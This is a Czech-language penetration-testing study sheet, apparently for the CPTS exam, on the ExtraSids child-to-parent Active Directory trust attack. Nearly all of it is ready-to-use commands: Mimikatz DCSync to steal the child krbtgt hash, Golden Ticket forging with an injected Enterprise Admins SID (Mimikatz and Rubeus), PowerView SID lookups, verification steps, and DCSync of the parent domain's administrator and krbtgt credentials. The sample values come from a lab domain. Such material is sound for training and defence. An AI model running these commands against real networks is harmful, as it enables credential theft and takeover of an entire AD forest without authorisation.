# 📖 CPTS: Attacking Domain Trusts – Child ➔ Parent (ExtraSids Attack)

## 🎯 Cíl útoku

Pokud kompromituješ **Child Domain** v rámci stejného **AD Forestu**, můžeš získat kontrolu nad **Parent/Root Domainem** pomocí **ExtraSids útoku**.

Útok zneužívá:

- **SID History**
- **Golden Ticket**
- absenci **SID Filtering** mezi doménami ve stejném forestu

Výsledek:  
➡️ Child Domain Admin → Enterprise Admin v Root Domainu → celý Forest Compromise

---

# 🔑 Co potřebujeme

Pro útok potřebujeme:

1. **KRBTGT hash Child Domain**
2. **SID Child Domain**
3. **FQDN Child Domain**
4. **SID Enterprise Admins skupiny Parent Domain**
5. Uživatelské jméno (nemusí existovat)

---

# 1️⃣ Získání KRBTGT hashe (Child Domain)

Musíš mít práva Domain Admin v Child doméně.

### Mimikatz:

```
lsadump::dcsync /user:CHILD\krbtgt
```

Příklad:

```
Hash NTLM:
9d765b482771505cbe97411065964d5f
```

---

# 2️⃣ Získání SID Child Domain

### PowerView:

```
Get-DomainSID
```

Výstup:

```
S-1-5-21-2806153819-209893948-922872689
```

---

# 3️⃣ Získání Enterprise Admin SID (Parent)

Enterprise Admins má vždy RID:

```
-519
```

Například:

```
Parent Domain SID:
S-1-5-21-3842939050-3880317879-2865463114

Enterprise Admin SID:
S-1-5-21-3842939050-3880317879-2865463114-519
```

Nebo přes PowerView:

```
Get-DomainGroup -Domain PARENT.LOCAL -Identity "Enterprise Admins" | select objectsid
```

---

# 🚀 ExtraSids Attack - Mimikatz

Vytvoření falešného Golden Ticketu:

```
kerberos::golden 
/user:hacker 
/domain:CHILD.LOCAL 
/sid:<CHILD_SID> 
/krbtgt:<KRBTGT_HASH> 
/sids:<ENTERPRISE_ADMIN_SID> 
/ptt
```

Příklad:

```
kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```

---

# 🚀 ExtraSids Attack - Rubeus

Alternativa:

```
Rubeus.exe golden 
/rc4:<KRBTGT_HASH>
/domain:<CHILD_DOMAIN>
/sid:<CHILD_SID>
/sids:<ENTERPRISE_ADMIN_SID>
/user:hacker
/ptt
```

---

# ✅ Ověření útoku

## Kontrola Kerberos ticketu:

```
klist
```

Měl by existovat:

```
Client: hacker @ CHILD.DOMAIN
```

---

## Přístup na Parent DC

Před útokem:

```
ls \\PARENT-DC\c$
```

Výsledek:

```
Access denied
```

Po útoku:

```
ls \\PARENT-DC\c$
```

Výsledek:

```
Directory listing
```

---

# 🩸 DCSync Parent Domain

Po získání Enterprise Admin práv:

```
lsadump::dcsync /user:PARENT\administrator /domain:PARENT.LOCAL
```

Nebo získání KRBTGT:

```
lsadump::dcsync /user:PARENT\krbtgt /domain:PARENT.LOCAL
```

---

# 🧠 CPTS Quick Checklist

## Child Domain

☐ Domain Admin přístup  
☐ DCSync krbtgt

```
lsadump::dcsync /user:CHILD\krbtgt
```

☐ Získat Child SID

```
Get-DomainSID
```

---

## Parent Domain

☐ Najít Enterprise Admin SID

```
Domain SID + -519
```

---

## Attack

☐ Vytvořit Golden Ticket:

```
kerberos::golden /user:hacker /domain:<child> /sid:<child_sid> /krbtgt:<hash> /sids:<EA_sid> /ptt
```

☐ Ověřit:

```
klist
```

☐ Přístup:

```
ls \\<parent_dc>\c$
```

---

# 🔥 Zapamatovat

```
Child Domain Admin
        |
        |
        ↓
Steal KRBTGT hash
        |
        |
        ↓
Golden Ticket + ExtraSID
        |
        |
        ↓
Enterprise Admin
        |
        |
        ↓
Entire Forest Compromise
```

**ExtraSids = Child Domain → Parent Domain takeover přes Kerberos trust.**